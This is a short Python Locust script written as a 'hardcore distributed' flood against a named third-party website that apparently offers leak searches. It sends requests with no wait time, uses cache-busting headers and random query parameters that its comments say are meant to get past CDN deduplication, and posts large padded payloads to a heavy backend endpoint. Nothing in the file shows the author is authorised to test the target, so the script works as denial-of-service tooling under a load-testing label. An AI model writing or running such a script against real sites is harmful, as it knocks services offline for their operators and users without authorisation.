# lol2.py
# Hardcore distributed Locust script: zero wait, cache bypass, heavy endpoints, disabled GC 🚀

from gevent import monkey
monkey.patch_all()

import gc
import uuid
import random
from locust import HttpUser, TaskSet, task, events, constant

# Disable Python GC to avoid pauses under heavy load
gc.disable()

class UserBehavior(TaskSet):
    def on_start(self):
        # Optional: auth, setup cookies, tokens, etc.
        pass

    @task(7)
    def search(self):
        # Simulate leak-search with cache-busting headers & query
        query = random.choice([
            "123456789012345678",
            "987654321098765432",
            "user_example",
            "ip:192.168.0.1",
        ])
        headers = {
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "X-Debug-Nonce": uuid.uuid4().hex,
        }
        # Append a random nocache param to foil CDN dedupe
        path = f"/?q={query}&nocache={uuid.uuid4().hex}"
        self.client.get(path, name="GET /?q", headers=headers)

    @task(3)
    def heavy_api(self):
        # Push the heavy backend endpoint
        payload = {"data": "x" * random.randint(1000, 10000)}
        self.client.post(
            "/api/process", json=payload, name="POST /api/process"
        )

class WebsiteUser(HttpUser):
    host = "https://restorecord-leak-search.vercel.app"
    tasks = [UserBehavior]
    # No think time - 100% spam
    wait_time = constant(0)

# Optional listeners for chaos logging
@events.test_start.add_listener
def on_test_start(environment, **kwargs):
    print("[ChaosMonkey] MAX-POWER stress test started...")

@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    print("[ChaosMonkey] MAX-POWER stress test complete.")
